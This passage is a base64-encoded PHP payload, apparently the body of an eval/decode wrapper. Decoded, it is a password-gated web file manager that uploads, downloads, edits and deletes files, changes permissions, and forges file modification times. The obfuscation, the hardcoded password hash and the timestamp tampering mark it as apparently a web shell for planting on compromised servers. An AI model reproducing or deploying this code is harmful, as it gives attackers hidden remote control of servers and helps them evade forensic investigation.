FQ1RPUllfU0VQQVJBVE9SIC4gYmFzZW5hbWUoJHVwbG9hZGVkRmlsZVsnbmFtZSddKTsKCiAgICAgICAgaWYgKG1vdmVfdXBsb2FkZWRfZmlsZSgkdXBsb2FkZWRGaWxlWyd0bXBfbmFtZSddLCAkdXBsb2FkRmlsZVBhdGgpKSB7CiAgICAgICAgICAgIGVjaG8gIjxwPkZpbGUgdXBsb2FkZWQgc3VjY2Vzc2Z1bGx5LjwvcD4iOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIGVjaG8gIjxwPkZhaWxlZCB0byB1cGxvYWQgdGhlIGZpbGUuPC9wPiI7CiAgICAgICAgfQogICAgfSBlbHNlIHsKICAgICAgICBlY2hvICI8cD5FcnJvciBkdXJpbmcgZmlsZSB1cGxvYWQuIEVycm9yIGNvZGU6ICIgLiAkdXBsb2FkZWRGaWxlWydlcnJvciddIC4gIjwvcD4iOwogICAgfQp9CgovLyBGdW5jdGlvbiB0byBkb3dubG9hZCBhIGZpbGUKaWYgKGlzc2V0KCRfR0VUWydhJ10pICYmICRfR0VUWydhJ10gPT09ICdkb3dubG9hZCcgJiYgaXNzZXQoJF9HRVRbJ2ZpbGUnXSkpIHsKICAgICRkb3dubG9hZEZpbGUgPSBzYW5pdGl6ZSgkX0dFVFsnZmlsZSddKTsKICAgICRkb3dubG9hZFBhdGggPSBnZXRGdWxsUGF0aCgkZG93bmxvYWRGaWxlKTsgLy8gVXNlIGdldEZ1bGxQYXRoIHRvIGdldCB0aGUgY29tcGxldGUgcGF0aAoKICAgIGlmIChmaWxlX2V4aXN0cygkZG93bmxvYWRQYXRoKSAmJiBpc19maWxlKCRkb3dubG9hZFBhdGgpKSB7CiAgICAgICAgaGVhZGVyKCdDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL29jdGV0LXN0cmVhbScpOwogICAgICAgIGhlYWRlcignQ29udGVudC1UcmFuc2Zlci1FbmNvZGluZzogQmluYXJ5Jyk7CiAgICAgICAgaGVhZGVyKCdDb250ZW50LUxlbmd0aDogJyAuIGZpbGVzaXplKCRkb3dubG9hZFBhdGgpKTsKICAgICAgICBoZWFkZXIoJ0NvbnRlbnQtRGlzcG9zaXRpb246IGF0dGFjaG1lbnQ7IGZpbGVuYW1lPSInIC4gYmFzZW5hbWUoJGRvd25sb2FkUGF0aCkgLiAnIicpOwogICAgICAgIHJlYWRmaWxlKCRkb3dubG9hZFBhdGgpOwogICAgICAgIGV4aXQ7CiAgICB9IGVsc2UgewogICAgICAgIGVjaG8gIjxwPkZpbGUgZG9lcyBub3QgZXhpc3Qgb3IgaXMgbm90IGEgdmFsaWQgZmlsZS48L3A+IjsKICAgIH0KfQoKLy8gSGFuZGxlIGRpcmVjdG9yeSBjcmVhdGlvbgppZiAoJF9TRVJWRVJbJ1JFUVVFU1RfTUVUSE9EJ10gPT09ICdQT1NUJyAmJiBpc3NldCgkX1BPU1RbJ2Rpck5hbWUnXSkpIHsKICAgICRuZXdEaXJOYW1lID0gc2FuaXRpemUoJF9QT1NUWydkaXJOYW1lJ10pOwogICAgJG5ld0RpclBhdGggPSBnZXRDdXJyZW50RGlyZWN0b3J5KCkgLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJG5ld0Rpck5hbWU7CgogICAgaWYgKCFmaWxlX2V4aXN0cygkbmV3RGlyUGF0aCkgJiYgbWtkaXIoJG5ld0RpclBhdGgpKSB7CiAgICAgICAgZWNobyAiPHA+RGlyZWN0b3J5IGNyZWF0ZWQgc3VjY2Vzc2Z1bGx5LjwvcD4iOwogICAgfSBlbHNlIHsKICAgICAgICBlY2hvICI8cD5GYWlsZWQgdG8gY3JlYXRlIHRoZSBkaXJlY3RvcnkuIEVpdGhlciB0aGUgZGlyZWN0b3J5IGFscmVhZHkgZXhpc3RzIG9yIHRoZXJlIHdhcyBhbiBlcnJvci48L3A+IjsKICAgIH0KfQoKLy8gSGFuZGxlIGFjY2VzcyBjb250cm9sCmlmICgkX1NFUlZFUlsnUkVRVUVTVF9NRVRIT0QnXSA9PT0gJ1BPU1QnICYmIGlzc2V0KCRfUE9TVFsncGFzc3dvcmQnXSkpIHsKICAgICRlbnRlcmVkUGFzc3dvcmQgPSBtZDUobWQ1KCRfUE9TVFsncGFzc3dvcmQnXSkpOwoKICAgIC8vIFJlcGxhY2UgJ3lvdXJfaGFzaGVkX3Bhc3N3b3JkJyB3aXRoIHRoZSBNRDUgaGFzaCBvZiB5b3VyIGRlc2lyZWQgcGFzc3dvcmQKICAgICRkZXNpcmVkUGFzc3dvcmRIYXNoID0gJzI2NTk2NmQ5MTNmNWQ3MWJjY2M2MTRmMTliMDY2NTkyJzsKCiAgICBpZiAoJGVudGVyZWRQYXNzd29yZCA9PT0gJGRlc2lyZWRQYXNzd29yZEhhc2gpIHsKICAgICAgICAkX1NFU1NJT05bJ2FjY2Vzc19ncmFudGVkJ10gPSB0cnVlOwogICAgICAgICRfU0VTU0lPTlsnbGFzdF9hY3Rpdml0eSddID0gdGltZSgpOyAvLyBVcGRhdGUgbGFzdCBhY3Rpdml0eSB0aW1lc3RhbXAKICAgICAgICBlY2hvICI8cD5BY2Nlc3MgZ3JhbnRlZC4gWW91IGNhbiBub3cgbmF2aWdhdGUgdGhyb3VnaCBkaXJlY3Rvcmllcy48L3A+IjsKICAgIH0gZWxzZSB7CiAgICAgICAgZWNobyAiPHA+QWNjZXNzIGRlbmllZC4gSW5jb3JyZWN0IHBhc3N3b3JkLjwvcD4iOwogICAgfQp9CgovLyBDaGVjayBpZiBhY2Nlc3MgaXMgZ3JhbnRlZAppZiAoIWlzc2V0KCRfU0VTU0lPTlsnYWNjZXNzX2dyYW50ZWQnXSkgfHwgJF9TRVNTSU9OWydhY2Nlc3NfZ3JhbnRlZCddICE9PSB0cnVlKSB7CiAgICBkaXNwbGF5QWNjZXNzRm9ybSgpOwogICAgZXhpdDsKfQoKLy8gQ2hlY2sgaWYgdGhlIHNlc3Npb24gaGFzIGV4cGlyZWQgKDEwIG1pbnV0ZXMgb2YgaW5hY3Rpdml0eSkKaWYgKGlzc2V0KCRfU0VTU0lPTlsnbGFzdF9hY3Rpdml0eSddKSAmJiAodGltZSgpIC0gJF9TRVNTSU9OWydsYXN0X2FjdGl2aXR5J10gPiA2MDApKSB7CiAgICBzZXNzaW9uX3Vuc2V0KCk7CiAgICBzZXNzaW9uX2Rlc3Ryb3koKTsKICAgIGVjaG8gIjxwPlNlc3Npb24gZXhwaXJlZC4gUGxlYXNlIGxvZyBpbiBhZ2Fpbi48L3A+IjsKICAgIGRpc3BsYXlBY2Nlc3NGb3JtKCk7CiAgICBleGl0Owp9CgovLyBVcGRhdGUgbGFzdCBhY3Rpdml0eSB0aW1lc3RhbXAgb24gZXZlcnkgcGFnZSBsb2FkCiRfU0VTU0lPTlsnbGFzdF9hY3Rpdml0eSddID0gdGltZSgpOwoKLy8gRGlzcGxheSB0aGUgY3VycmVudCBkaXJlY3RvcnkgcGF0aAplY2hvICI8cD5DdXJyZW50IERpcmVjdG9yeTogIiAuIGdldEN1cnJlbnREaXJlY3RvcnkoKSAuICI8L3A+IjsKCi8vIEFsd2F5cyBkaXNwbGF5IGEgbGluayB0byB0aGUgcGFyZW50IGRpcmVjdG9yeQokY3VycmVudERpcmVjdG9yeSA9IGdldEN1cnJlbnREaXJlY3RvcnkoKTsKJHBhcmVudERpcmVjdG9yeSA9IHJlYWxwYXRoKCRjdXJyZW50RGlyZWN0b3J5IC4gJy8uLicpOwoKLy8gRGlzcGxheSB0aGUgbGluayB0byB0aGUgcGFyZW50IGRpcmVjdG9yeQplY2hvICI8cD48YSBocmVmPSc/cD0iIC4gdXJsZW5jb2RlKCRwYXJlbnREaXJlY3RvcnkpIC4gIic+UGFyZW50IERpcmVjdG9yeTwvYT48L3A+IjsKCgoKLy8gR2V0IHRoZSBsaXN0IG9mIGZpbGVzIGFuZCBkaXJlY3RvcmllcyBpbiB0aGUgY3VycmVudCBkaXJlY3RvcnkKJGNvbnRlbnRzID0gc2NhbmRpcihnZXRDdXJyZW50RGlyZWN0b3J5KCkpOwoKLy8gRGlzcGxheSB0aGUgY3JlYXRlIGRpcmVjdG9yeSBmb3JtCmRpc3BsYXlDcmVhdGVEaXJGb3JtKCk7CmVjaG8gIjxoNSBjbGFzcz0nYm9yZGVyIHAtMSBtYi0zJz5VcGxvYWQgRmlsZTwvaDU+Cjxmb3JtIG1ldGhvZD0ncG9zdCcgYWN0aW9uPScnIGVuY3R5cGU9J211bHRpcGFydC9mb3JtLWRhdGEnPgogICAgPGRpdiBjbGFzcz0nZm9ybS1ncm91cCc+CiAgICAgICAgPGxhYmVsIGZvcj0ndXBsb2FkZWRfZmlsZSc+Q2hvb3NlIGEgZmlsZTo8L2xhYmVsPgogICAgICAgIDxpbnB1dCB0eXBlPSdmaWxlJyBuYW1lPSd1cGxvYWRlZF9maWxlJyBpZD0ndXBsb2FkZWRfZmlsZScgY2xhc3M9J2Zvcm0tY29udHJvbCcgcmVxdWlyZWQ+CiAgICAgICAgPGJ1dHRvbiB0eXBlPSdzdWJtaXQnIG5hbWU9J3MnIGNsYXNzPSdidG4gYnRuLW91dGxpbmUtbGlnaHQgcm91bmRlZC0wJz5VcGxvYWQgRmlsZTwvYnV0dG9uPgogICAgPC9kaXY+CjwvZm9ybT4iOwovLyBEaXNwbGF5IGEgdGFibGUgd2l0aCB0aGUgbGlzdCBvZiBmaWxlcyBhbmQgZGlyZWN0b3JpZXMKZWNobyAiPHRhYmxlIGJvcmRlcj0nMSc+CiAgICAgICAgPHRyPgogICAgICAgICAgICA8dGg+TmFtZTwvdGg+CiAgICAgICAgICAgIDx0aD5UeXBlPC90aD4KICAgICAgICAgICAgPHRoPlNpemU8L3RoPgogICAgICAgICAgICA8dGg+TW9kaWZpY2F0aW9uIFRpbWU8L3RoPgogICAgICAgICAgICA8dGg+UGVybWlzc2lvbjwvdGg+CiAgICAgICAgICAgIDx0aD5BY3Rpb248L3RoPgogICAgICAgIDwvdHI+IjsKCmZvcmVhY2ggKCRjb250ZW50cyBhcyAkaXRlbSkgewogICAgaWYgKCRpdGVtID09ICcuJyB8fCAkaXRlbSA9PSAnLi4nKSB7CiAgICAgICAgY29udGludWU7CiAgICB9CgogICAgJGl0ZW1QYXRoID0gZ2V0RnVsbFBhdGgoJGl0ZW0pOwogICAgJHNpemUgPSBpc19maWxlKCRpdGVtUGF0aCkgPyBmaWxlc2l6ZSgkaXRlbVBhdGgpIDogJyc7CiAgICAkcGVybWlzc2lvbiA9IGlzX2ZpbGUoJGl0ZW1QYXRoKSA/IHBlcm1zKCRpdGVtUGF0aCkgOiBwZXJtc0RpcigkaXRlbVBhdGgpOwoKICAgIGVjaG8gIjx0cj4KICAgICAgICAgICAgPHRkPjxhIGhyZWY9Jz9wPSIgLiB1cmxlbmNvZGUoJGl0ZW1QYXRoKSAuICInPiRpdGVtPC9hPjwvdGQ+CiAgICAgICAgICAgIDx0ZD4iIC4gKGlzX2RpcigkaXRlbVBhdGgpID8gJ0RpcmVjdG9yeScgOiAnRmlsZScpIC4gIjwvdGQ+CiAgICAgICAgICAgIDx0ZD4kc2l6ZTwvdGQ+CiAgICAgICAgICAgIDx0ZD4iIC4gZm9ybWF0TW9kaWZpY2F0aW9uVGltZShmaWxlbXRpbWUoJGl0ZW1QYXRoKSkgLiAiPC90ZD4KICAgICAgICAgICAgPHRkPiRwZXJtaXNzaW9uPC90ZD4KICAgICAgICAgICAgPHRkPiI7CgogICAgaWYgKGlzX2ZpbGUoJGl0ZW1QYXRoKSkgewogICAgICAgIGVjaG8gIjxhIGhyZWY9Jz9wPSIgLiB1cmxlbmNvZGUoZ2V0Q3VycmVudERpcmVjdG9yeSgpKSAuICImYT0iIC4gdXJsZW5jb2RlKCdkb3dubG9hZCcpIC4gIiZmaWxlPSIgLiB1cmxlbmNvZGUoJGl0ZW0pIC4gIic+RG93bmxvYWQ8L2E+IjsKICAgICAgICBlY2hvICIgfCA8YSBocmVmPSc/cD0iIC4gdXJsZW5jb2RlKGdldEN1cnJlbnREaXJlY3RvcnkoKSkgLiAiJmE9IiAuIHVybGVuY29kZSgnZWRpdCcpIC4gIiZuPSIgLiB1cmxlbmNvZGUoJGl0ZW0pIC4gIic+RWRpdDwvYT4iOwogICAgICAgIGVjaG8gIiB8IDxhIGhyZWY9Jz9wPSIgLiB1cmxlbmNvZGUoZ2V0Q3VycmVudERpcmVjdG9yeSgpKSAuICImYT0iIC4gdXJsZW5jb2RlKCdlZGl0X3Blcm1pc3Npb24nKSAuICImbj0iIC4gdXJsZW5jb2RlKCRpdGVtKSAuICInPkVkaXQgUGVybWlzc2lvbjwvYT4iOwogICAgICAgIC8vIEZvciBmaWxlcywgc2V0IGRlbGV0ZSBsaW5rIHRvICdkZWxldGUnCiAgICAgICAgZWNobyAiIHwgPGEgaHJlZj0nP3A9IiAuIHVybGVuY29kZShnZXRDdXJyZW50RGlyZWN0b3J5KCkpIC4gIiZhPSIgLiB1cmxlbmNvZGUoJ2RlbGV0ZScpIC4gIiZuPSIgLiB1cmxlbmNvZGUoJGl0ZW0pIC4gIic+RGVsZXRlPC9hPiI7CiAgICB9IGVsc2UgewogICAgICAgIC8vIEZvciBkaXJlY3Rvcmllcywgc2V0IGRlbGV0ZSBsaW5rIHRvICdkZWxldGVfZGlyJwogICAgICAgIGVjaG8gIiB8IDxhIGhyZWY9Jz9wPSIgLiB1cmxlbmNvZGUoZ2V0Q3VycmVudERpcmVjdG9yeSgpKSAuICImYT0iIC4gdXJsZW5jb2RlKCdkZWxldGVfZGlyJykgLiAiJm49IiAuIHVybGVuY29kZSgkaXRlbSkgLiAiJz5EZWxldGUgRGlyZWN0b3J5PC9hPiI7CiAgICAgICAgZWNobyAiIHwgPGEgaHJlZj0nP3A9IiAuIHVybGVuY29kZShnZXRDdXJyZW50RGlyZWN0b3J5KCkpIC4gIiZhPSIgLiB1cmxlbmNvZGUoJ2VkaXRfcGVybWlzc2lvbicpIC4gIiZuPSIgLiB1cmxlbmNvZGUoJGl0ZW0pIC4gIic+RWRpdCBQZXJtaXNzaW9uPC9hPiI7CiAgICB9CgogICAgZWNobyAiIHwgPGEgaHJlZj0nP3A9IiAuIHVybGVuY29kZShnZXRDdXJyZW50RGlyZWN0b3J5KCkpIC4gIiZhPSIgLiB1cmxlbmNvZGUoJ2VkaXRfbW9kaWZpY2F0aW9uX3RpbWUnKSAuICImbj0iIC4gdXJsZW5jb2RlKCRpdGVtKSAuICInPkVkaXQgTW9kaWZpY2F0aW9uIFRpbWU8L2E+IjsKICAgIAogICAgZWNobyAiPC90ZD4KICAgICAgICAgIDwvdHI+IjsKfQoKZWNobyAiPC90YWJsZT4iOwoKCgoKCgoKLy8gRnVuY3Rpb24gdG8gaGFuZGxlIGVkaXRpbmcgcGVybWlzc2lvbgppZiAoaXNzZXQoJF9HRVRbJ2EnXSkgJiYgJF9HRVRbJ2EnXSA9PT0gJ2VkaXRfcGVybWlzc2lvbicgJiYgaXNzZXQoJF9HRVRbJ24nXSkpIHsKICAgICRlZGl0SXRlbSA9IHNhbml0aXplKCRfR0VUWyduJ10pOwogICAgJGVkaXRJdGVtUGF0aCA9IGdldEZ1bGxQYXRoKCRlZGl0SXRlbSk7CgogICAgaWYgKGZpbGVfZXhpc3RzKCRlZGl0SXRlbVBhdGgpKSB7CiAgICAgICAgaWYgKCRfU0VSVkVSWydSRVFVRVNUX01FVEhPRCddID09PSAnUE9TVCcgJiYgaXNzZXQoJF9QT1NUWydwZXJtaXNzaW9uJ10pKSB7CiAgICAgICAgICAgICRuZXdQZXJtaXNzaW9uID0gJF9QT1NUWydwZXJtaXNzaW9uJ107CiAgICAgICAgICAgIGlmIChpc19udW1lcmljKCRuZXdQZXJtaXNzaW9uKSAmJiAkbmV3UGVybWlzc2lvbiA+PSAwICYmICRuZXdQZXJtaXNzaW9uIDw9IDc3NykgewogICAgICAgICAgICAgICAgY2htb2QoJGVkaXRJdGVtUGF0aCwgb2N0ZGVjKCRuZXdQZXJtaXNzaW9uKSk7CiAgICAgICAgICAgICAgICBlY2hvICI8cD5QZXJtaXNzaW9uIHVwZGF0ZWQgc3VjY2Vzc2Z1bGx5LjwvcD4iOwogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgZWNobyAiPHA+SW52YWxpZCBwZXJtaXNzaW9uIHZhbHVlLjwvcD4iOwogICAgICAgICAgICB9CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgaWYgKGlzX2ZpbGUoJGVkaXRJdGVtUGF0aCkpIHsKICAgICAgICAgICAgICAgIGRpc3BsYXlFZGl0UGVybWlzc2lvbkZvcm1GaWxlKCRlZGl0SXRlbVBhdGgpOwogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgZGlzcGxheUVkaXRQZXJtaXNzaW9uRm9ybURpcigkZWRpdEl0ZW1QYXRoKTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0gZWxzZSB7CiAgICAgICAgZWNobyAiPHA+Q2Fubm90IGVkaXQgcGVybWlzc2lvbi4gRWl0aGVyIHRoZSBpdGVtIGRvZXMgbm90IGV4aXN0IG9yIGl0IGlzIG5vdCB3cml0YWJsZS48L3A+IjsKICAgIH0KfQoKLy8gRnVuY3Rpb24gdG8gaGFuZGxlIGVkaXRpbmcgbW9kaWZpY2F0aW9uIHRpbWUKaWYgKGlzc2V0KCRfR0VUWydhJ10pICYmICRfR0VUWydhJ10gPT09ICdlZGl0X21vZGlmaWNhdGlvbl90aW1lJyAmJiBpc3NldCgkX0dFVFsnbiddKSkgewogICAgJGVkaXRJdGVtID0gc2FuaXRpemUoJF9HRVRbJ24nXSk7CiAgICAkZWRpdEl0ZW1QYXRoID0gZ2V0RnVsbFBhdGgoJGVkaXRJdGVtKTsKCiAgICBpZiAoZmlsZV9leGlzdHMoJGVkaXRJdGVtUGF0aCkpIHsKICAgICAgICBpZiAoJF9TRVJWRVJbJ1JFUVVFU1RfTUVUSE9EJ10gPT09ICdQT1NUJyAmJiBpc3NldCgkX1BPU1RbJ21vZGlmaWNhdGlvblRpbWUnXSkpIHsKICAgICAgICAgICAgJG5ld01vZGlmaWNhdGlvblRpbWUgPSBzdHJ0b3RpbWUoJF9QT1NUWydtb2RpZmljYXRpb25UaW1lJ10pOwogICAgICAgICAgICBpZiAoJG5ld01vZGlmaWNhdGlvblRpbWUgIT09IGZhbHNlKSB7CiAgICAgICAgICAgICAgICB0b3VjaCgkZWRpdEl0ZW1QYXRoLCAkbmV3TW9kaWZpY2F0aW9uVGltZSk7CiAgICAgICAgICAgICAgICBlY2hvICI8cD5Nb2RpZmljYXRpb24gdGltZSB1cGRhdGVkIHN1Y2Nlc3NmdWxseS48L3A+IjsKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIGVjaG8gIjxwPkludmFsaWQgbW9kaWZpY2F0aW9uIHRpbWUgdmFsdWUuPC9wPiI7CiAgICAgICAgICAgIH0KICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBkaXNwbGF5RWRpdE1vZGlmaWNhdGlvblRpbWVGb3JtKCRlZGl0SXRlbVBhdGgpOwogICAgICAgIH0KICAgIH0gZWxzZSB7CiAgICAgICAgZWNobyAiPHA+Q2Fubm90IGVkaXQgbW9kaWZpY2F0aW9uIHRpbWUuIEVpdGhlciB0aGUgaXRlbSBkb2VzIG5vdCBleGlzdCBvciBpdCBpcyBub3Qgd3JpdGFibGUuPC9wPiI7CiAgICB9Cn0KCj8+PD9waHAg")); ?>